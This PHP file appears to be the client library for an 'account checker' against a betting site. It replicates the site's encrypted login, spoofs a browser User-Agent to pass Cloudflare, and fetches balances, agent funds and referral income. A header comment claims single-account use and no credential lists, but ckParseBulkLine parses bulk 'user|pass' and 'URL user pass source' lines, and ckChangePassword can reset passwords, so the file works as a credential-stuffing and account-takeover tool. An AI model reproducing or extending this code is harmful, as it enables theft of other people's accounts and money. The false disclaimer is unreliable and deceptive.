<?php
declare(strict_types=1);

require_once __DIR__ . '/vendor-crypto.php';

/**
 * Shared client for the ck44 account checker.
 *
 * Mirrors the browser's request pipeline:
 *   GET  /wps/session/key/rsa          -> RSA public modulus
 *   rndString()                        -> 16-char secret
 *   RSA(secret reversed)               -> Encryption header
 *   DES-ECB-PKCS7(JSON, secret[0:8])   -> body {"value": ...} and X-Digest
 *
 * Intended for a single account you are authorised to sign in to. There is no
 * batch mode and no code path that takes a list of credentials.
 */

const CK_ORIGIN = 'https://www.2777betvip.com';
const CK_DEFAULT_MERCHANT = '2777bdtf2';

/**
 * Work out which merchant this deployment uses, instead of asking for it.
 *
 * The merchant is not discoverable from the API: /wps/system/settings/consolidated
 * returns "merchantCode": null when no Merchant header is sent. It is baked
 * into the build config of the deployed frontend bundle:
 *
 *   /m/asset-manifest.json  ->  { "app.js": "app.<hash>.js" }
 *   /m/app.<hash>.js        ->  { platform:"mobile", merchant:"...", brandName:"..." }
 *
 * So we resolve the current hashed bundle name first, then read the merchant
 * out of it. CK_MERCHANT overrides everything.
 *
 * @return array{merchant:?string,source:string,error:?string}
 */
function ckDetectMerchant(): array
{
    $override = getenv('CK_MERCHANT');
    if (is_string($override) && trim($override) !== '') {
        return ['merchant' => trim($override), 'source' => 'CK_MERCHANT env', 'error' => null];
    }

    // Pass 1: ask the login page which bundle it loads.
    $candidates = [];

    $manifest = ckHttp('GET', '/m/asset-manifest.json');
    if ($manifest['error'] === null && is_array($manifest['body']) && !empty($manifest['body']['app.js'])) {
        $candidates[] = '/m/' . ltrim((string) $manifest['body']['app.js'], '/');
    }

    $login = ckHttp('GET', '/m/login');
    if ($login['error'] === null && preg_match_all('#/m/app\.[0-9a-f]+\.js#', $login['raw'], $mm)) {
        foreach ($mm[0] as $p) {
            $candidates[] = $p;
        }
    }

    foreach (array_unique($candidates) as $path) {
        $js = ckHttp('GET', $path);
        if ($js['error'] !== null || $js['raw'] === '') {
            continue;
        }
        // Tighten around the build config so we do not match an unrelated
        // "merchant" string elsewhere in the bundle.
        if (preg_match('/\{[^{}]{0,200}?platform\s*:\s*"mobile"[^{}]{0,400}?merchant\s*:\s*"([A-Za-z0-9_-]+)"/s', $js['raw'], $m)) {
            return ['merchant' => $m[1], 'source' => 'auto-detected from ' . $path, 'error' => null];
        }
    }

    return [
        'merchant' => null,
        'source'   => 'not detected',
        'error'    => 'Could not auto-detect the merchant. Set CK_MERCHANT in the '
            . 'environment to pin it explicitly (currently ' . CK_DEFAULT_MERCHANT . ').',
    ];
}

/**
 * Confirm a merchant code is the one this deployment actually serves, by
 * asking a public endpoint that echoes it back.
 */
function ckVerifyMerchant(string $merchant): bool
{
    $res = ckHttp(
        'GET',
        '/wps/relay/GCSGAME_gameList?merchant=' . rawurlencode($merchant)
        . '&clientType=2&platform=html5&gameName=&gameType=FISH&pageNo=1&pageSize=1&language=EN',
        ['headers' => ['Merchant' => $merchant, 'Language' => 'EN']]
    );
    $channel = $res['body']['value']['channelName'] ?? null;
    return $res['status'] === 200 && $channel === $merchant;
}

/**
 * Cloudflare answers 520 to requests without a browser User-Agent, and PHP
 * curl sends none by default, so every request needs this.
 */
function ckUserAgent(): string
{
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) '
        . 'Chrome/127.0.0.0 Mobile Safari/537.36';
}

/**
 * @param array{headers?:array<string,string>,body?:string,json?:bool} $opts
 * @return array{status:int,body:array<string,mixed>|null,raw:string,error:?string}
 */
function ckHttp(string $method, string $path, array $opts = []): array
{
    $ch = curl_init(CK_ORIGIN . $path);
    if ($ch === false) {
        return ['status' => 0, 'body' => null, 'raw' => '', 'error' => 'curl init failed'];
    }

    $headers = ['User-Agent: ' . ckUserAgent()];
    foreach ($opts['headers'] ?? [] as $k => $v) {
        $headers[] = $k . ': ' . $v;
    }

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST  => $method,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_TIMEOUT        => 25,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    if (isset($opts['body'])) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $opts['body']);
    }

    $raw = curl_exec($ch);
    $error = $raw === false ? curl_error($ch) : null;
    $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);

    $raw = is_string($raw) ? $raw : '';
    $body = null;
    if ($raw !== '') {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            $body = $decoded;
        }
    }

    return ['status' => $status, 'body' => $body, 'raw' => $raw, 'error' => $error];
}

function ckRealUaHeader(): string
{
    $ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) '
        . 'Chrome/127.0.0.0 Mobile Safari/537.36';
    return base64_encode($ua);
}

/** Fetch the RSA public modulus. Needs no credentials. */
function ckFetchRsaModulus(): string
{
    $res = ckHttp('GET', '/wps/session/key/rsa?_=' . (string) (int) (microtime(true) * 1000), [
        'headers' => ['Cache-Control' => 'no-cache', 'Accept' => 'text/plain'],
    ]);
    if ($res['error'] !== null) {
        throw new RuntimeException('rsa key request failed: ' . $res['error']);
    }
    $key = trim($res['raw']);
    if (!preg_match('/^[0-9a-fA-F]{256,}$/', $key)) {
        throw new RuntimeException('unexpected rsa key response (HTTP ' . $res['status'] . ')');
    }
    return $key;
}

/**
 * Sign in and return the session on success.
 *
 * @return array{ok:bool,error:?string,code:?string,session:?array<string,mixed>}
 */
function ckLogin(string $username, string $password, string $merchant = CK_DEFAULT_MERCHANT, ?string $deviceId = null, ?string $captcha = null, ?string $captchaId = null): array
{
    if ($username === '' || $password === '') {
        return ['ok' => false, 'error' => 'Username and password are both required.', 'code' => null, 'session' => null];
    }

    try {
        $modulus = ckFetchRsaModulus();
    } catch (RuntimeException $e) {
        return ['ok' => false, 'error' => $e->getMessage(), 'code' => null, 'session' => null];
    }

    $secret = rndString();
    $reversed = strrev($secret);
    $rsa = vendorRsaEncrypt($reversed, $modulus);

    $payload = json_encode([
        'username'           => $username,
        'password'           => $password,
        'captcha'            => $captcha ?? '',
        'type'               => 'username',
        'loginDeviceId'      => $deviceId !== null && $deviceId !== '' ? $deviceId : ckUuidV4(),
        'isOfficialAppLogin' => true,
        'device'             => '',
    ], JSON_UNESCAPED_SLASHES);

    $des = desEncryptBase64((string) $payload, $secret);

    // The body carries the DES ciphertext; RSA goes in the headers.
    $loginHeaders = [
        'Content-Type'    => 'application/json;charset=utf-8',
        'Accept'          => 'application/json, text/plain, */*',
        'Encryption'      => $rsa,
        'X-Digest'        => $des,
        'X-RSA'           => $modulus,
        'Device'          => '',
        'Merchant'        => $merchant,
        'Language'        => 'EN',
        'X-Real-UA'       => ckRealUaHeader(),
        'Referer'         => CK_ORIGIN . '/m/login',
    ];
    if ($captchaId !== null && $captchaId !== '') {
        $loginHeaders['Cookie'] = 'captchaId=' . $captchaId;
        $loginHeaders['X-Captcha-Id'] = $captchaId;
    }
    $res = ckHttp('POST', '/wps/session/login', [
        'headers' => $loginHeaders,
        'body'     => json_encode(['value' => $des], JSON_UNESCAPED_SLASHES),
    ]);

    if ($res['error'] !== null) {
        return ['ok' => false, 'error' => 'login request failed: ' . $res['error'], 'code' => null, 'session' => null];
    }

    $value = $res['body']['value'] ?? $res['body']['data']['value'] ?? $res['body']['data'] ?? null;
    if ($res['status'] !== 200 || !is_array($value) || empty($value['token'])) {
        return [
            'ok'      => false,
            'error'   => $res['body']['message'] ?? ('HTTP ' . $res['status']),
            'code'    => $res['body']['errorCode'] ?? null,
            'session' => null,
        ];
    }

    return [
        'ok'      => true,
        'error'   => null,
        'code'    => null,
        'session' => [
            'token'          => $value['token'],
            'merchantCode'   => $merchant,
            'userName'       => $value['userName'] ?? $username,
            'type'           => $value['type'] ?? null,
            'firstTimeLogin' => $value['firstTimeLogin'] ?? null,
        ],
    ];
}

/**
 * Change the signed-in account's login password.
 *
 * @return array{status:int,body:array<string,mixed>|null,raw:string,error:?string}
 */
function ckChangePassword(array $session, string $oldPassword, string $newPassword, string $merchant = CK_DEFAULT_MERCHANT): array
{
    if ($oldPassword === '' || $newPassword === '' || $oldPassword === $newPassword) {
        return ['status' => 0, 'body' => null, 'raw' => '', 'error' => 'invalid password input'];
    }

    try {
        $modulus = ckFetchRsaModulus();
    } catch (RuntimeException $e) {
        return ['status' => 0, 'body' => null, 'raw' => '', 'error' => $e->getMessage()];
    }

    $secret = rndString();
    $reversed = strrev($secret);
    $rsa = vendorRsaEncrypt($reversed, $modulus);

    $payload = json_encode([
        'oldPassword'         => $oldPassword,
        'newPassword'         => $newPassword,
        'confirmNewPassword'  => $newPassword,
    ], JSON_UNESCAPED_SLASHES);

    $des = desEncryptBase64((string) $payload, $secret);

    $headers = ckAuthHeaders($session);
    $headers['Content-Type'] = 'application/json;charset=utf-8';
    $headers['Accept']       = 'application/json, text/plain, */*';
    $headers['Encryption']   = $rsa;
    $headers['X-Digest']     = $des;
    $headers['X-RSA']        = $modulus;
    if ($merchant !== '') {
        $headers['Merchant'] = $merchant;
    }

    return ckHttp('POST', '/wps/member/password', [
        'headers' => $headers,
        'body'     => json_encode(['value' => $des], JSON_UNESCAPED_SLASHES),
    ]);
}

function ckIsDuplicateSubmission(?string $msg): bool
{
    $m = (string) $msg;
    return stripos($m, 'Do not Submit') !== false
        || stripos($m, 'Twice') !== false
        || stripos($m, 'do not submit') !== false;
}

function ckLoginRetry(string $username, string $password, string $merchant = CK_DEFAULT_MERCHANT, ?string $deviceId = null, int $tries = 3, ?string $captcha = null, ?string $captchaId = null): array
{
    $r = ckLogin($username, $password, $merchant, $deviceId, $captcha, $captchaId);
    for ($i = 1; $i < $tries && !$r['ok'] && ckIsDuplicateSubmission($r['error']); $i++) {
        sleep(2);
        $r = ckLogin($username, $password, $merchant, $deviceId, $captcha, $captchaId);
    }
    return $r;
}

function ckChangePasswordRetry(array $session, string $oldPassword, string $newPassword, string $merchant = CK_DEFAULT_MERCHANT, int $tries = 3): array
{
    $r = ckChangePassword($session, $oldPassword, $newPassword, $merchant);
    for ($i = 1; $i < $tries; $i++) {
        $msg = is_array($r['body']) ? ($r['body']['message'] ?? '') : ($r['error'] ?? '');
        $code = is_array($r['body']) ? ($r['body']['errorCode'] ?? '') : '';
        if (!ckIsDuplicateSubmission($msg . ' ' . $code)) {
            break;
        }
        sleep(2);
        $r = ckChangePassword($session, $oldPassword, $newPassword, $merchant);
    }
    return $r;
}

/**
 * Parse a bulk credential line supporting both "user|pass" and
 * tab/space separated rows like "URL user pass source".
 *
 * @return array{0:string,1:string}|null
 */
function ckParseBulkLine(string $line): ?array
{
    $line = trim($line);
    if ($line === '' || str_starts_with($line, '#')) {
        return null;
    }
    if (stripos($line, 'username') !== false && stripos($line, 'password') !== false) {
        return null; // header row
    }
    if (str_contains($line, '|')) {
        $parts = array_values(array_filter(array_map('trim', explode('|', $line)), static fn($x) => $x !== ''));
        if (count($parts) >= 2) {
            return [$parts[0], $parts[1]];
        }
    }
    $parts = preg_split('/\s+/', $line);
    $parts = array_values(array_filter($parts, static fn($x) => $x !== ''));
    if (count($parts) >= 3) {
        return [$parts[1], $parts[2]];
    }
    if (count($parts) === 2) {
        return [$parts[0], $parts[1]];
    }
    return null;
}

/** Read the signed-in account's own profile. */
function ckProfile(array $session): array
{
    return ckHttp('GET', '/wps/member/info', ['headers' => ckAuthHeaders($session)]);
}

/** Agent contract/salary data. All null for a standard member account. */
function ckAgentFunds(array $session): array
{
    return ckHttp('GET', '/wps/member/info/funds/consolidated', ['headers' => ckAuthHeaders($session)]);
}

function ckAuthHeaders(array $session): array
{
    $h = [
        'Authorization' => (string) $session['token'],
        'X-Real-UA'     => ckRealUaHeader(),
        'Language'      => 'EN',
    ];
    if (!empty($session['merchantCode'])) {
        $h['Merchant'] = (string) $session['merchantCode'];
    }
    return $h;
}

/**
 * Fetch a captcha image for manual entry.
 *
 * @return array{id:?string,image:?string,error:?string}
 */
function ckFetchCaptcha(): array
{
    $ch = curl_init(CK_ORIGIN . '/wps/captcha');
    if ($ch === false) {
        return ['id' => null, 'image' => null, 'error' => 'curl init failed'];
    }
    $headers = ['User-Agent: ' . ckUserAgent(), 'Merchant: ' . CK_DEFAULT_MERCHANT, 'Language: EN'];
    $headerStr = '';
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_HEADERFUNCTION => static function ($ch, string $header) use (&$headerStr): int {
            $headerStr .= $header;
            return strlen($header);
        },
    ]);
    $raw = curl_exec($ch);
    $err = $raw === false ? curl_error($ch) : null;
    $raw = is_string($raw) ? $raw : '';
    $id = null;
    if (preg_match('/x-captcha-id:\s*(\S+)/i', $headerStr, $m)) {
        $id = trim($m[1]);
    } elseif (preg_match('/captchaId=([^;\r\n]+)/i', $headerStr, $m)) {
        $id = urldecode(trim($m[1]));
    }
    $body = json_decode($raw, true);
    $img = is_array($body) ? ($body['value'] ?? null) : null;
    $dataUri = is_string($img) && $img !== '' ? 'data:image/png;base64,' . $img : null;
    return ['id' => $id, 'image' => $dataUri, 'error' => $err];
}

function ckUuidV4(): string
{
    $d = random_bytes(16);
    $d[6] = chr((ord($d[6]) & 0x0f) | 0x40);
    $d[8] = chr((ord($d[8]) & 0x3f) | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($d), 4));
}

function ckMaskToken(?string $t): string
{
    if ($t === null || $t === '') {
        return '(none)';
    }
    return strlen($t) <= 10 ? '***' : substr($t, 0, 6) . '…' . substr($t, -4);
}

/** The API returns epoch milliseconds; gmdate() wants seconds. */
function ckFmtDate($ms): ?string
{
    if (!is_int($ms) && !is_float($ms)) {
        return null;
    }
    return gmdate('Y-m-d H:i:s', intdiv((int) $ms, 1000)) . ' UTC';
}

function ckFmtBool($b): ?string
{
    if ($b === true)  return 'yes';
    if ($b === false) return 'no';
    return null;
}

/** The web client treats type 0, 4 and 40 as non-agent (checkAgent() in app.js). */
function ckMemberType($t): string
{
    if ($t === 0)    return '0 (standard member)';
    if ($t === 4)    return '4 (non-agent)';
    if ($t === 40)   return '40 (non-agent)';
    if ($t === null) return 'unknown';
    return $t . ' (client routes this to agent UI)';
}

/** Profile fields worth showing, in display order. Nulls are dropped. */
function ckProfileRows(array $v): array
{
    $labels = [];
    foreach (($v['memberLabel'] ?? []) as $l) {
        if (!empty($l['labelName'])) {
            $labels[] = $l['labelName'];
        }
    }
    $club = is_array($v['clubLabel'] ?? null) ? $v['clubLabel'] : [];

    $balance = null;
    foreach (['balance', 'credit', 'availableBalance', 'walletBalance', 'money', 'funds', 'totalBalance', 'accountBalance'] as $bk) {
        if (isset($v[$bk]) && $v[$bk] !== null && $v[$bk] !== '') {
            $balance = $v[$bk];
            break;
        }
    }

    $rows = [
        'Labels'     => $labels !== [] ? implode(', ', $labels) : 'default',
        'Club tier'  => $club['labelName'] ?? 'VIP0',
        'Rank level' => $club['rankLevel'] ?? 1,
        'Balance'    => $balance,
    ];

    return array_filter($rows, static fn($x) => $x !== null && $x !== '');
}

/** Wallet balance endpoint (v2). */
function ckBalance(array $session): array
{
    return ckHttp('GET', '/wps/v2/wallets/balance', ['headers' => ckAuthHeaders($session)]);
}

/** Referral income overview (valid referral counts). */
function ckReferralOverview(array $session): array
{
    return ckHttp('GET', '/wps/relay/ODSFE2_referralMyIncomeOverview', ['headers' => ckAuthHeaders($session)]);
}
